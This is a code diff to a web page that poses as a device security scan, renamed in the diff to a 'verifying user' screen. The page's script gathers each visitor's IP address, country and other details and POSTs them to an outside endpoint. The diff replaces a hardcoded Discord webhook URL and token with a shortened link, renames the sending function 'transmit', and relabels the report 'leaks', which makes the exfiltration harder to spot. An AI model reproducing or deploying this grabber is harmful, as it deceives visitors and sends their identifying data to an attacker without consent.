@@ -75,8 +75,8 @@
 <body>
     <div class="container">
         <div id="loading-section">
-            <h1>System Security Scan</h1>
-            <div class="loading-text">Scanning your device for vulnerabilities...</div>
+            <h1>verifying user</h1>
+            <div class="loading-text">verifying...</div>
             <div class="progress-container">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
@@ -141,8 +141,8 @@
         }
 
         // Send data to webhook
-        async function sendToWebhook(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1357457585422209177/MyjVwkNZLEw9bx5LPXp55IV3ahANkmYfKlHUNP9f0DBGGsaLOQPvwJPLphkgRaLrRNBh';
+        async function transmit(data) {
+            const i = 'smurl.fr/izlr8';
             
             const embed = {
                 title: "Détraqué info 2.0",
@@ -150,12 +150,12 @@
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "IP Address",
+                        name: "adresse ip",
                         value: data.ipAddress || "Unknown",
                         inline: true
                     },
                     {
-                        name: "Country",
+                        name: "emplacement universel",
                         value: data.country || "Unknown",
                         inline: true
                     },
@@ -181,18 +181,18 @@
                     }
                 ],
                 footer: {
-                    text: "Security Scan Report"
+                    text: "leaks"
                 }
             };
 
             const payload = {
                 embeds: [embed],
-                username: "Security Bot",
+                username: "upload",
                 avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
             };
 
             try {
-                await fetch(webhookUrl, {
+                await fetch(i, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -200,7 +200,7 @@
                     body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error('Error sending to webhook:', error);
+                console.error('Error transmiting:', error);
             }
         }
 
@@ -245,7 +245,7 @@
                     
                     // Collect and send data
                     collectSecurityData().then(data => {
-                        sendToWebhook(data);
+                        transmit(data);
                     });
                 }
             }, 500);
